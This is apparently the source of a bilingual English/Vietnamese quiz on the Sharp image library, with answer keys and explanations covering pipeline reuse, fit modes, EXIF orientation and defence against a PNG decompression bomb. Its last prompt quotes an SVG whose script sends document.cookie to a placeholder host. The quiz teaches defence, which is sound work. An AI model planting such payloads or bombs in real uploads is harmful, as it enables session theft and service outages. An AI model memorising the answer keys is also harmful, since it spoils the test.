            'Same mechanism as the previous question, seen from the error side. The constructor stores the buffer and the chain stores instructions; neither reads a byte of image data, so neither can know the buffer is garbage. Measured on sharp 0.35.4, the rejection message is exactly <code>Input buffer contains unsupported image format</code>, and it arrives from <code>toBuffer()</code>. The rule is one line long: wrap the <code>await</code>. In the repo\'s optimizer that is why there are exactly two <code>try</code> blocks, around <code>await pipeline.metadata()</code> and around <code>await pipeline.webp(...).toBuffer()</code> — the only two places libvips can fail. Option 1 describes a real hazard for genuinely fire-and-forget promises, but here the promise <em>is</em> awaited, so a <code>try</code> around that await catches it normally. Options 3 and 4 invent behaviour: there is no placeholder substitution, and <code>webp()</code> appends to the instruction list rather than rebuilding it.',
            'Cùng cơ chế với câu trước, nhìn từ phía lỗi. Constructor cất cái buffer và chuỗi cất các chỉ thị; không cái nào đọc một byte dữ liệu ảnh nào, nên không cái nào biết được buffer là rác. Đo trên sharp 0.35.4, thông báo từ chối đúng là <code>Input buffer contains unsupported image format</code>, và nó tới từ <code>toBuffer()</code>. Quy tắc dài đúng một dòng: hãy bọc cái <code>await</code>. Trong bộ tối ưu của kho, đó là lý do có đúng hai khối <code>try</code>, quanh <code>await pipeline.metadata()</code> và quanh <code>await pipeline.webp(...).toBuffer()</code> — hai chỗ duy nhất libvips hỏng được. Phương án 1 mô tả một hiểm hoạ có thật với những promise thả trôi thật sự, nhưng ở đây promise CÓ được await, nên một <code>try</code> quanh cái await đó bắt được nó bình thường. Phương án 3 và 4 bịa ra hành vi: không có việc thay bằng ảnh giữ chỗ, và <code>webp()</code> nối thêm vào danh sách chỉ thị chứ không dựng lại nó.',
          ),
        }),

        // q6 · đáp án 3
        mcq({
          prompt: B(
            'You need WebP and JPEG from one source. Someone measures the naive version and reports it "works":' +
              code("const p = sharp(photo).resize(800)\nconst a = await p.webp().toBuffer()   // → webp\nconst b = await p.jpeg().toBuffer()   // → jpeg") +
              'Given that the measurement is genuine, what is the correct conclusion?',
            'Bạn cần WebP và JPEG từ một nguồn. Có người đo phiên bản ngây thơ và báo rằng nó "chạy được":' +
              code("const p = sharp(photo).resize(800)\nconst a = await p.webp().toBuffer()   // → webp\nconst b = await p.jpeg().toBuffer()   // → jpeg") +
              'Cho rằng phép đo là thật, kết luận đúng là gì?',
          ),
          options: [
            B(
              'The measurement disproves the <code>clone()</code> advice — since both formats come out correctly, <code>clone()</code> is a legacy recommendation from before Sharp made pipelines reusable, and calling it now just adds an allocation per variant.',
              'Phép đo bác bỏ lời khuyên dùng <code>clone()</code> — vì cả hai format đều ra đúng, <code>clone()</code> là lời khuyên cũ từ thời Sharp chưa cho tái dùng pipeline, và gọi nó bây giờ chỉ thêm một lần cấp phát cho mỗi variant.',
            ),
            B(
              'The second call re-read the source from disk, so it was never really the same pipeline; the only cost is the duplicate decode, and <code>clone()</code> is purely a performance optimisation with no correctness role.',
              'Lời gọi thứ hai đã đọc lại nguồn từ đĩa, nên nó chưa bao giờ thật sự là cùng một pipeline; chi phí duy nhất là lượt giải mã lặp lại, và <code>clone()</code> thuần tuý là một tối ưu hiệu năng, không có vai trò gì về tính đúng đắn.',
            ),
            B(
              'It works only because <code>jpeg()</code> happens to be listed after <code>webp()</code> alphabetically; reversing the two calls would produce two WebP buffers, so the rule is simply to order format calls alphabetically.',
              'Nó chạy được chỉ vì <code>jpeg()</code> tình cờ đứng sau <code>webp()</code> theo thứ tự bảng chữ cái; đảo hai lời gọi sẽ cho hai buffer WebP, nên quy tắc đơn giản là gọi các format theo thứ tự bảng chữ cái.',
            ),
            B(
              'Every transform method returns the same mutable instance, so after the second call that one pipeline has had two output formats set on it and the last one wins. It "works" here by accident of ordering, not by contract, and the same shape silently breaks as soon as a third variant or a shared helper reorders the calls — <code>base.clone().webp()</code> and <code>base.clone().jpeg()</code> fork the instruction list so each output is independent.',
              'Mọi method biến đổi đều trả về chính một instance có thể thay đổi được, nên sau lời gọi thứ hai thì một pipeline duy nhất đó đã bị đặt hai format output và cái sau cùng thắng. Nó "chạy được" ở đây là do tình cờ thứ tự, không phải do hợp đồng, và đúng hình dạng đó vỡ trong im lặng ngay khi có variant thứ ba hoặc một hàm dùng chung đảo thứ tự lời gọi — <code>base.clone().webp()</code> và <code>base.clone().jpeg()</code> rẽ nhánh danh sách chỉ thị nên mỗi output độc lập.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The measurement is real: on sharp 0.35.4 the second <code>toBuffer()</code> did not throw, and the two buffers really were WebP and JPEG. That is precisely what makes the pattern dangerous — it is a behaviour you observed, not a behaviour you were promised. The instance is mutable and shared; setting <code>jpeg()</code> after <code>webp()</code> leaves one pipeline carrying both, and which one applies is an implementation detail. Depend on it and a later refactor — a third format, a helper that sets the format before the caller does, a variant loop — changes the answer with no error anywhere. <code>clone()</code> forks the instruction list while sharing the decoded input, which is both correct and cheap. Option 1 draws exactly the wrong lesson from a passing observation. Option 2 invents a re-read that did not happen; the buffer was already in memory. Option 3 invents an alphabetical rule, which is the kind of explanation that fits one measurement and predicts nothing.',
            'Phép đo là thật: trên sharp 0.35.4 lời gọi <code>toBuffer()</code> thứ hai không ném lỗi, và hai buffer đúng là WebP và JPEG. Chính điều đó làm cái pattern này nguy hiểm — đó là hành vi bạn QUAN SÁT ĐƯỢC, không phải hành vi được cam kết. Instance là thứ thay đổi được và dùng chung; đặt <code>jpeg()</code> sau <code>webp()</code> để lại một pipeline mang cả hai, và cái nào có hiệu lực là chi tiết cài đặt. Dựa vào nó thì một lần tái cấu trúc về sau — một format thứ ba, một hàm phụ đặt format trước cả người gọi, một vòng lặp variant — sẽ đổi câu trả lời mà không có lỗi ở đâu cả. <code>clone()</code> rẽ nhánh danh sách chỉ thị trong khi vẫn dùng chung phần input đã giải mã, vừa đúng vừa rẻ. Phương án 1 rút ra đúng bài học ngược từ một quan sát may mắn. Phương án 2 bịa ra một lượt đọc lại vốn không xảy ra; buffer đã nằm sẵn trong bộ nhớ. Phương án 3 bịa ra một quy tắc theo bảng chữ cái, đúng kiểu giải thích vừa khít một phép đo và không dự báo được gì.',
          ),
        }),

        // q7 · đáp án 2
        mcq({
          prompt: B(
            'Two timings on the same 776,180-byte PNG:' +
              code("metadata() trên bomb: 0.8 ms → 16000x16000 = 256 MP\ndecode đầy đủ:        200.4 ms") +
              'What design rule do these two numbers justify?',
            'Hai số đo trên cùng một file PNG 776.180 byte:' +
              code("metadata() trên bomb: 0.8 ms → 16000x16000 = 256 MP\ndecode đầy đủ:        200.4 ms") +
              'Hai con số này biện minh cho quy tắc thiết kế nào?',
          ),
          options: [
            B(
              'That PNG decoding is slow enough to justify converting every upload to JPEG on arrival, since JPEG headers parse faster and the decode cost then drops to the 0.8 ms range for subsequent operations.',
              'Rằng giải mã PNG chậm tới mức đáng chuyển mọi bản upload sang JPEG ngay khi tới, vì header JPEG phân giải nhanh hơn và chi phí giải mã sau đó tụt về khoảng 0,8 ms cho các thao tác kế tiếp.',
            ),
            B(
              'That the 0.8 ms figure is a warm-cache artifact and the real gate must be the byte size, because only the byte size is known before any libvips call happens at all.',
              'Rằng con số 0,8 ms là sản phẩm của cache nóng và cái cổng thật phải là kích thước byte, vì chỉ kích thước byte mới biết được trước khi có bất kỳ lời gọi libvips nào.',
            ),
            B(
              'That <code>metadata()</code> is the cheap gate you run first: it parses only the header, costs about 1/250th of a decode, and returns <code>width</code> and <code>height</code> — which is the one pair of numbers that predicts memory. Reject on that, and a hostile upload costs under a millisecond instead of 200 ms and a nine-figure pixel count.',
              'Rằng <code>metadata()</code> là cái cổng RẺ bạn chạy trước: nó chỉ phân giải header, tốn khoảng 1/250 một lượt giải mã, và trả về <code>width</code> cùng <code>height</code> — đúng cặp số dự báo được bộ nhớ. Loại ngay ở đó thì một bản upload thù địch tốn chưa tới một mili giây thay vì 200 ms và một số pixel chín chữ số.',
            ),
            B(
              'That you should always call <code>metadata()</code> twice — once before the decode to plan, and once after it on the output — because the first call cannot see the true dimensions of a compressed source and the second corrects them.',
              'Rằng bạn nên luôn gọi <code>metadata()</code> hai lần — một lần trước khi giải mã để hoạch định, và một lần sau đó trên output — vì lời gọi đầu không thấy được kích thước thật của một nguồn đã nén còn lời gọi sau chỉnh lại chúng.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The ratio is the whole argument. <code>metadata()</code> reads a header: 0.8 ms on the 256-megapixel file, and 0.4 ms on the ordinary 12-megapixel photo. A full decode of the same file took 200.4 ms and pushed RSS from 82 MB to 196 MB. So ordering your guards cheapest-first is not a style preference — it is a 250× difference in what a bad upload costs you. Header check first, decode only after it passes. Option 1 gets the causality backwards: the cost is the 256 million pixels, not the PNG format, and re-encoding to JPEG means decoding first, which is the expensive step you were trying to avoid. Option 2 is the exact hole the file exploits — 776 KB is a perfectly ordinary size, and every byte-based limit in the stack waves it through. Option 4 confuses two different reasons to read metadata: the pre-decode read is a gate, and the post-encode <code>info</code> is what you store as the file\'s true shape; neither corrects the other.',
            'Cái tỉ số chính là toàn bộ lập luận. <code>metadata()</code> đọc header: 0,8 ms trên file 256 megapixel, và 0,4 ms trên tấm ảnh 12 megapixel thông thường. Một lượt giải mã đầy đủ cùng file đó mất 200,4 ms và đẩy RSS từ 82 MB lên 196 MB. Nên việc xếp các chốt chặn theo thứ tự rẻ-trước không phải sở thích văn phong — nó là khác biệt 250 lần trong cái giá mà một bản upload xấu bắt bạn trả. Kiểm header trước, chỉ giải mã sau khi nó qua. Phương án 1 lộn ngược nhân quả: chi phí nằm ở 256 triệu pixel, không nằm ở định dạng PNG, và encode lại sang JPEG nghĩa là phải giải mã trước, đúng cái bước đắt đỏ mà bạn đang muốn né. Phương án 2 chính là lỗ hổng mà file này khai thác — 776 KB là một kích thước hoàn toàn bình thường, và mọi giới hạn dựa trên byte trong stack đều cho nó đi qua. Phương án 4 lẫn lộn hai lý do khác nhau để đọc metadata: lượt đọc trước giải mã là một cái cổng, còn <code>info</code> sau khi encode là thứ bạn LƯU lại làm hình dạng thật của file; không cái nào chỉnh cái nào.',
          ),
        }),

        // q8 · đáp án 0
        mcq({
          prompt: B(
            'Measured on a synthetic upload: a 776,180-byte flat-colour PNG, processed with the default options, moved RSS from 82 MB to 196 MB and took 208 ms. A genuine 7,857,079-byte photo — ten times the bytes — moved RSS by 4 MB and took 70 ms. Which check separates them?',
            'Đo trên một bản upload tổng hợp: một PNG một màu 776.180 byte, xử lý với tuỳ chọn mặc định, đẩy RSS từ 82 MB lên 196 MB và mất 208 ms. Một tấm ảnh thật 7.857.079 byte — gấp mười lần số byte — chỉ đẩy RSS thêm 4 MB và mất 70 ms. Phép kiểm nào tách được hai cái đó?',
          ),
          options: [
            B(
              'Only <code>metadata().width × metadata().height</code> against a pixel budget. The small file is 16000×16000 = 256 megapixels of one colour, which compresses to almost nothing, so file size, MIME type, magic bytes and extension all pass it — they are all telling the truth. Pixels are the axis that predicts memory, and the repo caps them at 100 MP.',
              'Chỉ có <code>metadata().width × metadata().height</code> so với một ngân sách pixel. File nhỏ đó là 16000×16000 = 256 megapixel của đúng một màu, nén lại còn gần như không có gì, nên kích thước file, MIME type, magic byte và đuôi file đều cho nó qua — chúng đều đang nói thật. PIXEL mới là cái trục dự báo bộ nhớ, và kho chặn chúng ở 100 MP.',
            ),
            B(
              'A compression-ratio check: reject any upload whose uncompressed size divided by its stored size exceeds about 50, since that ratio is what distinguishes a real photograph from a crafted file and needs no header parsing to compute.',
              'Một phép kiểm tỉ lệ nén: loại mọi bản upload có kích thước chưa nén chia cho kích thước lưu trữ vượt quá khoảng 50, vì chính tỉ lệ đó phân biệt một bức ảnh thật với một file được dựng có chủ đích, và tính nó không cần phân giải header.',
            ),
            B(
              'A stricter MIME allowlist that accepts only <code>image/jpeg</code> and <code>image/webp</code>. The attack depends on PNG\'s lossless compression, so removing PNG from the accepted set removes the entire class without needing a pixel budget.',
              'Một danh sách MIME cho phép chặt hơn, chỉ nhận <code>image/jpeg</code> và <code>image/webp</code>. Đòn tấn công dựa vào nén không mất dữ liệu của PNG, nên bỏ PNG khỏi tập được nhận sẽ xoá cả lớp tấn công mà không cần ngân sách pixel nào.',
            ),
            B(
              'A per-request memory watchdog that samples <code>process.memoryUsage().rss</code> during the decode and aborts the pipeline once it crosses a threshold, since only a runtime measurement can catch a file whose header understates its true cost.',
              'Một bộ canh bộ nhớ cho từng request, lấy mẫu <code>process.memoryUsage().rss</code> trong lúc giải mã và huỷ pipeline khi vượt ngưỡng, vì chỉ một phép đo lúc chạy mới bắt được một file có header khai thấp hơn chi phí thật của nó.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Both files were generated for this exam and both are genuine images. The bomb is 16000×16000 of solid white; PNG compresses that to 776,180 bytes, which is smaller than the real photo by a factor of ten and passes every byte-shaped check. Decoding it cost 208 ms and 114 MB of RSS against the photo\'s 70 ms and 4 MB. Only the header dimensions see it coming, and reading them costs 0.8 ms. Option 2 sounds principled but you cannot compute an uncompressed size without the dimensions, so it collapses into the pixel check with extra steps — and a legitimate flat-background product shot has a huge ratio too. Option 3 does not remove the class: WebP lossless and animated formats reach the same place, and dropping PNG breaks screenshots and transparency, which is most of what a product needs PNG for. Option 4 acts after the cost has already been paid, cannot unwind a libvips allocation mid-decode, and does nothing about the concurrency case where eight such requests arrive together.',
            'Cả hai file đều được sinh ra cho đề này và cả hai đều là ảnh thật. Quả bom là 16000×16000 màu trắng đặc; PNG nén nó xuống 776.180 byte, nhỏ hơn tấm ảnh thật mười lần và qua được mọi phép kiểm hình dạng byte. Giải mã nó tốn 208 ms và 114 MB RSS, so với 70 ms và 4 MB của tấm ảnh. Chỉ kích thước trong header mới thấy nó tới, và đọc chúng tốn 0,8 ms. Phương án 2 nghe có nguyên tắc nhưng bạn không tính được kích thước chưa nén nếu không có kích thước ảnh, nên nó sụp về đúng phép kiểm pixel kèm mấy bước thừa — và một ảnh sản phẩm nền phẳng hợp lệ cũng có tỉ lệ khổng lồ. Phương án 3 không xoá được cả lớp tấn công: WebP không mất dữ liệu và các định dạng ảnh động cũng tới được chỗ đó, còn bỏ PNG thì hỏng ảnh chụp màn hình và ảnh trong suốt, vốn là phần lớn lý do một sản phẩm cần PNG. Phương án 4 hành động sau khi chi phí đã trả xong, không tháo lui được một lần cấp phát của libvips giữa lúc giải mã, và không làm gì được với tình huống tám request loại đó ập tới cùng lúc.',
          ),
        }),

        // q9 · đáp án 2
        mcq({
          prompt: B(
            'The same 4032×3024 source was run through <code>resize(800, 800, { fit })</code> five times and the output dimensions recorded:' +
              code("fit='cover'        → 800x800\nfit='contain'      → 800x800\nfit='fill'         → 800x800\nfit='inside'       → 800x600\nfit='outside'      → 1067x800") +
              'A product slot needs "never larger than 800 in either dimension, never cropped, never letterboxed". Which fit, and what does the default do instead?',
            'Cùng một nguồn 4032×3024 được chạy qua <code>resize(800, 800, { fit })</code> năm lần và kích thước output được ghi lại:' +
              code("fit='cover'        → 800x800\nfit='contain'      → 800x800\nfit='fill'         → 800x800\nfit='inside'       → 800x600\nfit='outside'      → 1067x800") +
              'Một ô sản phẩm cần "không bao giờ lớn hơn 800 ở cả hai chiều, không cắt, không viền đen". Chọn fit nào, và mặc định làm gì thay vào đó?',
          ),
          options: [
            B(
              '<code>contain</code>. It is the only mode that guarantees both dimensions fit, and the padding it adds is transparent by default so nothing is visible; the default <code>fill</code> would stretch the photo to 800×800 and distort it.',
              '<code>contain</code>. Đó là mode duy nhất bảo đảm cả hai chiều lọt vào, và phần đệm nó thêm mặc định là trong suốt nên không thấy gì; mặc định <code>fill</code> sẽ kéo ảnh cho vừa 800×800 và làm méo nó.',
            ),
            B(
              '<code>outside</code>. "Never larger than 800" is what <code>outside</code> enforces — it stops as soon as a dimension reaches the box; the 1067 in the measurement is the <em>source</em> width being reported, not the output.',
              '<code>outside</code>. "Không bao giờ lớn hơn 800" đúng là điều <code>outside</code> bảo đảm — nó dừng ngay khi một chiều chạm hộp; con số 1067 trong phép đo là chiều rộng NGUỒN được báo lại, không phải output.',
            ),
            B(
              '<code>inside</code> — it is the only one whose output is not 800×800, because it scales until both dimensions fit and then stops, giving 800×600 here. The default is <code>cover</code>, which fills the box and <em>crops</em> the overflow, so a full-body portrait comes back as a headshot with the legs gone and no error anywhere.',
              '<code>inside</code> — nó là mode duy nhất có output không phải 800×800, vì nó thu nhỏ tới khi CẢ HAI chiều lọt vào rồi dừng, ở đây ra 800×600. Mặc định là <code>cover</code>, tức lấp đầy cái hộp rồi CẮT phần thừa, nên một ảnh chân dung toàn thân trở về thành ảnh chân dung nửa người mất hẳn phần chân mà chẳng có lỗi ở đâu.',
            ),
            B(
              '<code>fill</code>, with <code>withoutEnlargement</code> set so it cannot stretch upward. That combination bounds both dimensions without cropping, and the default without any <code>fit</code> is <code>inside</code>, which is why width-only calls preserve aspect ratio.',
              '<code>fill</code>, kèm <code>withoutEnlargement</code> để nó không kéo giãn lên được. Tổ hợp đó chặn cả hai chiều mà không cắt, và mặc định khi không truyền <code>fit</code> nào là <code>inside</code>, đó là lý do các lời gọi chỉ-theo-width giữ được tỉ lệ.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Read the measurement column: three modes return exactly 800×800 and two do not, and that split is the whole answer. <code>cover</code> (the default), <code>contain</code> and <code>fill</code> all guarantee the requested box — by cropping, by padding and by stretching respectively. <code>inside</code> and <code>outside</code> guarantee a <em>bound</em> instead and let the output size vary: <code>inside</code> fits within the box (800×600 from a 4:3 source), <code>outside</code> covers it (1067×800, which is genuinely larger than the box on one axis). "Never larger, never cropped, never letterboxed" is the definition of <code>inside</code>. Option 1 picks the padding mode, which letterboxes — and Sharp\'s default pad is opaque black unless you pass <code>background</code>. Option 2 misreads the table: 1067×800 is the output, and it exceeds the box, which is what <code>outside</code> is for. Option 4 gets both defaults wrong; the default is <code>cover</code>, and a width-only call preserves aspect because there is no second constraint to conflict with, not because of a fit mode.',
            'Hãy đọc cột số đo: ba mode trả về đúng 800×800 và hai mode thì không, và chính sự tách đôi đó là toàn bộ câu trả lời. <code>cover</code> (mặc định), <code>contain</code> và <code>fill</code> đều bảo đảm đúng cái hộp đã yêu cầu — lần lượt bằng cách cắt, đệm và kéo giãn. <code>inside</code> và <code>outside</code> thì bảo đảm một CẬN thay vì vậy và để kích thước output thay đổi: <code>inside</code> lọt vào trong hộp (800×600 từ nguồn 4:3), <code>outside</code> phủ kín hộp (1067×800, và con số đó thật sự lớn hơn hộp ở một trục). "Không bao giờ lớn hơn, không cắt, không viền" đúng là định nghĩa của <code>inside</code>. Phương án 1 chọn mode đệm, tức là có viền — và phần đệm mặc định của Sharp là màu đen đục nếu bạn không truyền <code>background</code>. Phương án 2 đọc sai bảng: 1067×800 chính là output, và nó vượt hộp, đó đúng là công dụng của <code>outside</code>. Phương án 4 sai cả hai mặc định; mặc định là <code>cover</code>, và một lời gọi chỉ-theo-width giữ được tỉ lệ vì không có ràng buộc thứ hai để xung đột, chứ không phải vì một fit mode nào.',
          ),
        }),

        // q10 · đáp án 0
        mcq({
          prompt: B(
            'A 400×400 PNG avatar was run through <code>.resize({ width: 1200 })</code> with and without one flag:' +
              code("KHÔNG cờ  → 1200x1200, 95420 B\nCÓ cờ     → 400x400,  29548 B") +
              'Which flag, and why is filtering the size list against <code>metadata().width</code> still needed on top of it?',
            'Một avatar PNG 400×400 được chạy qua <code>.resize({ width: 1200 })</code> có và không có một cái cờ:' +
              code("KHÔNG cờ  → 1200x1200, 95420 B\nCÓ cờ     → 400x400,  29548 B") +
              'Cờ nào, và vì sao vẫn cần lọc danh sách kích thước theo <code>metadata().width</code> bên cạnh nó?',
          ),
          options: [
            B(
              '<code>withoutEnlargement: true</code>. Without it Sharp interpolates the avatar up 3×, producing a file 3.2× larger that is visibly softer, because interpolation invents pixels that were never captured. The flag stops the <em>blur</em>, but the variant is still generated — filtering the size list against the source width is what stops the pointless 1200 px file from existing at all, and with it the storage and the request that serve it.',
              '<code>withoutEnlargement: true</code>. Không có nó, Sharp nội suy avatar lên 3×, cho ra một file lớn hơn 3,2 lần và thấy rõ là mềm hơn, vì nội suy bịa ra những pixel chưa từng được ghi. Cái cờ chặn được phần MỜ, nhưng variant vẫn cứ được sinh ra — lọc danh sách kích thước theo chiều rộng nguồn mới là thứ chặn hẳn sự tồn tại của cái file 1200 px vô nghĩa đó, và kèm theo là phần lưu trữ cùng lượt request phục vụ nó.',
            ),
            B(
              '<code>fit: \'inside\'</code>. With a single width argument Sharp defaults to stretching to the requested box, and <code>inside</code> is what makes it stop at the source size; the extra size-list filter is only a micro-optimisation for the request count.',
              '<code>fit: \'inside\'</code>. Với một tham số width duy nhất, Sharp mặc định kéo giãn cho vừa cái hộp đã yêu cầu, và <code>inside</code> là thứ làm nó dừng ở kích thước nguồn; bộ lọc danh sách kích thước thêm vào chỉ là một tối ưu vi mô cho số lượng request.',
            ),
            B(
              '<code>kernel: \'nearest\'</code>. The default <code>lanczos3</code> kernel is what softens an upscale, and switching kernels keeps the edges hard; the size-list filter then exists to avoid running the slower kernel on sources that do not need it.',
              '<code>kernel: \'nearest\'</code>. Kernel mặc định <code>lanczos3</code> mới là thứ làm mềm một lần phóng to, và đổi kernel giữ được cạnh sắc; bộ lọc danh sách kích thước khi đó tồn tại để khỏi chạy kernel chậm hơn trên những nguồn không cần tới.',
            ),
            B(
              '<code>failOn: \'none\'</code>. It tells libvips to leave an image alone rather than resampling it when the requested size is unreachable, and the size-list filter is the belt-and-braces version of the same guarantee for animated sources.',
              '<code>failOn: \'none\'</code>. Nó bảo libvips để yên một tấm ảnh chứ đừng lấy mẫu lại khi kích thước yêu cầu không với tới được, và bộ lọc danh sách kích thước là phiên bản chắc-ăn-gấp-đôi của cùng bảo đảm đó cho các nguồn ảnh động.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Measured: 1200×1200 at 95,420 bytes against 400×400 at 29,548 bytes — 3.2× the storage for an image that now looks worse, because every interpolation kernel is guessing at detail that was never captured. <code>withoutEnlargement: true</code> makes the resize a no-op when the source is already smaller than the target. The second half of the answer is the part people skip: the flag prevents the blur but the pipeline still ran and still produced a file. In a multi-variant pipeline you filter <code>SIZES</code> against <code>metadata().width</code> <em>before</em> the loop, so a 600 px source produces only the 400 px variant and the 800 and 1600 rungs are never encoded, never stored and never served. One guard fixes quality; the other fixes cost. Option 2 misstates the default — a width-only resize preserves aspect ratio, it does not stretch. Option 3 changes the interpolation but still upscales, so you get hard-edged, blocky invented pixels instead of soft ones. Option 4 is unrelated: <code>failOn</code> controls how tolerant libvips is of corrupt input.',
            'Đo thật: 1200×1200 ở 95.420 byte so với 400×400 ở 29.548 byte — gấp 3,2 lần dung lượng cho một tấm ảnh giờ trông tệ hơn, vì mọi kernel nội suy đều đang đoán phần chi tiết chưa từng được ghi. <code>withoutEnlargement: true</code> làm cho bước resize thành vô tác dụng khi nguồn vốn đã nhỏ hơn đích. Nửa sau của câu trả lời là phần người ta hay bỏ qua: cái cờ ngăn được độ mờ nhưng pipeline vẫn chạy và vẫn sinh ra một file. Trong một pipeline nhiều variant, bạn lọc <code>SIZES</code> theo <code>metadata().width</code> TRƯỚC vòng lặp, để một nguồn 600 px chỉ sinh ra variant 400 px còn hai bậc 800 và 1600 không bao giờ được encode, không bao giờ được lưu và không bao giờ được phục vụ. Một chốt chặn vá chất lượng; cái kia vá chi phí. Phương án 2 nói sai mặc định — một lượt resize chỉ theo width giữ nguyên tỉ lệ chứ không kéo giãn. Phương án 3 đổi cách nội suy nhưng vẫn phóng to, nên bạn được những pixel bịa ra sắc cạnh và vuông vức thay vì mềm nhoè. Phương án 4 không liên quan: <code>failOn</code> điều khiển mức độ khoan dung của libvips với đầu vào hỏng.',
          ),
        }),

        // q11 · đáp án 3
        mcq({
          prompt: B(
            'Four copies of one photo, differing only in their EXIF Orientation tag, were read with <code>metadata()</code>:' +
              code("orient-1.jpg → orientation=1 width=4032 height=3024 | autoOrient={\"width\":4032,\"height\":3024}\norient-3.jpg → orientation=3 width=4032 height=3024 | autoOrient={\"width\":4032,\"height\":3024}\norient-6.jpg → orientation=6 width=4032 height=3024 | autoOrient={\"width\":3024,\"height\":4032}\norient-8.jpg → orientation=8 width=4032 height=3024 | autoOrient={\"width\":3024,\"height\":4032}") +
              'Your DB column <code>imageWidth</code> is filled from <code>metadata().width</code>. What is broken, and what fixes it?',
            'Bốn bản sao của một tấm ảnh, chỉ khác nhau ở thẻ EXIF Orientation, được đọc bằng <code>metadata()</code>:' +
              code("orient-1.jpg → orientation=1 width=4032 height=3024 | autoOrient={\"width\":4032,\"height\":3024}\norient-3.jpg → orientation=3 width=4032 height=3024 | autoOrient={\"width\":4032,\"height\":3024}\norient-6.jpg → orientation=6 width=4032 height=3024 | autoOrient={\"width\":3024,\"height\":4032}\norient-8.jpg → orientation=8 width=4032 height=3024 | autoOrient={\"width\":3024,\"height\":4032}") +
              'Cột DB <code>imageWidth</code> của bạn được điền từ <code>metadata().width</code>. Cái gì hỏng, và vá thế nào?',
          ),
          options: [
            B(
              'Nothing is broken — all four report 4032, so the column is consistent. The rotation is a rendering concern that belongs in CSS via <code>image-orientation</code>, and storing the stored-pixel width is the correct, format-independent choice.',
              'Không có gì hỏng — cả bốn đều báo 4032, nên cột đó nhất quán. Việc xoay là chuyện dựng hình thuộc về CSS qua <code>image-orientation</code>, và lưu chiều rộng của pixel đã lưu mới là lựa chọn đúng, không phụ thuộc định dạng.',
            ),
            B(
              'Orientations 3 and 6 are the broken pair — both are 180° cases where the axes stay put but the pixels are inverted, so the width is right and only the row order is wrong. Re-reading the file with <code>{ failOn: \'none\' }</code> normalises it.',
              'Orientation 3 và 6 là cặp bị hỏng — cả hai là trường hợp 180° nơi hai trục giữ nguyên nhưng pixel bị đảo, nên chiều rộng thì đúng và chỉ thứ tự hàng là sai. Đọc lại file với <code>{ failOn: \'none\' }</code> sẽ chuẩn hoá nó.',
            ),
            B(
              'The tag itself is the problem: keeping it with <code>.withMetadata()</code> is the complete fix, because a preserved orientation tag makes every viewer and every downstream tool render the file correctly without touching the pixels.',
              'Bản thân cái thẻ mới là vấn đề: giữ nó lại bằng <code>.withMetadata()</code> là cách vá trọn vẹn, vì một thẻ orientation được bảo toàn khiến mọi trình xem và mọi công cụ phía sau dựng file đúng mà không phải đụng tới pixel.',
            ),
            B(
              'Orientations 6 and 8 involve a 90° turn, so the stored pixels are landscape while the photo displays as portrait — half your portrait uploads get a landscape aspect ratio in the UI. Call <code>.rotate()</code> with <b>no arguments</b> so the orientation is applied to the pixels, then store <code>info.width</code>/<code>info.height</code> from the encoded output; on sharp 0.35.4 <code>metadata().autoOrient</code> already reports that post-rotation pair if you need it before encoding.',
              'Orientation 6 và 8 là hai trường hợp xoay 90°, nên pixel đã lưu là nằm ngang trong khi tấm ảnh hiển thị là ảnh dọc — một nửa số ảnh dọc người dùng upload sẽ nhận tỉ lệ ngang trong giao diện. Hãy gọi <code>.rotate()</code> <b>không tham số</b> để hướng xoay được áp thẳng vào pixel, rồi lưu <code>info.width</code>/<code>info.height</code> từ output đã encode; trên sharp 0.35.4 thì <code>metadata().autoOrient</code> đã báo sẵn cặp số sau-xoay đó nếu bạn cần biết trước khi encode.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Read the two columns against each other. <code>width</code>/<code>height</code> describe the pixels as stored and are 4032×3024 for all four files. <code>autoOrient</code> describes how the file <em>displays</em>, and it swaps only for orientations 6 and 8 — the two 90° cases. Orientation 3 is a 180° turn, which keeps the axes. So filling a dimensions column from <code>metadata().width</code> gives every portrait photo a landscape aspect ratio: broken grid layout, wrong-shaped blur placeholder, and a bug nobody can reproduce on their own landscape test images. The fix has two halves. Apply the rotation to the pixels with argument-less <code>.rotate()</code> — which reads each file\'s own tag and is a no-op for orientation 1 — and store the dimensions from the output <code>info</code>, which is post-rotation and post-resize by construction. Option 1 relies on a rendering hint that your re-encode is about to discard. Option 2 has the pairs backwards. Option 3 is the trap the lesson names: preserved orientation is unreliable across WebP/AVIF viewers, any later re-encode drops it again, and keeping EXIF also ships the uploader\'s GPS coordinates.',
            'Hãy đọc hai cột đối chiếu nhau. <code>width</code>/<code>height</code> mô tả pixel như đã lưu và là 4032×3024 với cả bốn file. <code>autoOrient</code> mô tả cách file HIỂN THỊ, và nó chỉ đảo trục ở orientation 6 và 8 — hai trường hợp xoay 90°. Orientation 3 là xoay 180°, vốn giữ nguyên hai trục. Nên điền một cột kích thước từ <code>metadata().width</code> là gán cho mọi ảnh dọc một tỉ lệ ngang: bố cục lưới vỡ, ảnh mờ giữ chỗ sai hình dạng, và một bug mà không ai tái hiện được trên chính những ảnh ngang họ dùng để thử. Cách vá có hai nửa. Áp phép xoay vào pixel bằng <code>.rotate()</code> không tham số — nó đọc thẻ riêng của từng file và là vô tác dụng với orientation 1 — rồi lưu kích thước từ <code>info</code> của output, vốn theo cấu tạo đã là sau-xoay và sau-resize. Phương án 1 dựa vào một gợi ý dựng hình mà chính lượt re-encode của bạn sắp vứt đi. Phương án 2 lộn cặp. Phương án 3 đúng là cái bẫy mà bài học đã nêu: thẻ orientation được giữ lại thì không đáng tin qua các trình xem WebP/AVIF, mọi lượt re-encode về sau lại làm rơi nó, và giữ EXIF còn kèm luôn toạ độ GPS của người upload.',
          ),
        }),

        /* ── Chương 2 — Sharp trong production (6 câu) ────────────────────── */

        // q12 · đáp án 1
        mcq({
          prompt: B(
            'This file was fed to Sharp and it read it happily:' +
              code("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\"/>\n  <script>fetch('https://x/?c='+document.cookie)</script>\n</svg>\n\nmetadata() → {\"format\":\"svg\",\"width\":100,\"height\":100,\"density\":72}") +
